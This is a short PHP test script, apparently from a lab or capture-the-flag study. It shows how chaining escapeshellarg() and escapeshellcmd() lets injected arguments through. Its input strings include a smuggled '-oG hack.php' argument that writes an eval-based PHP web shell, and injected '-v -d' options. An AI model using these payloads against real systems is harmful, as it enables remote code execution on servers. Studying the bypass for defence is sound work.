<?php
$host = "' <?php @eval(\$_POST[\"hack\"]);?> -oG hack.php '";
$host = "172.17.0.2' -v -d a=1";
$cc = escapeshellarg($host);
// echo $host."\n";
// echo "\n";
echo $cc;
echo "\n";
$dd = escapeshellcmd($cc);
echo $dd;
?>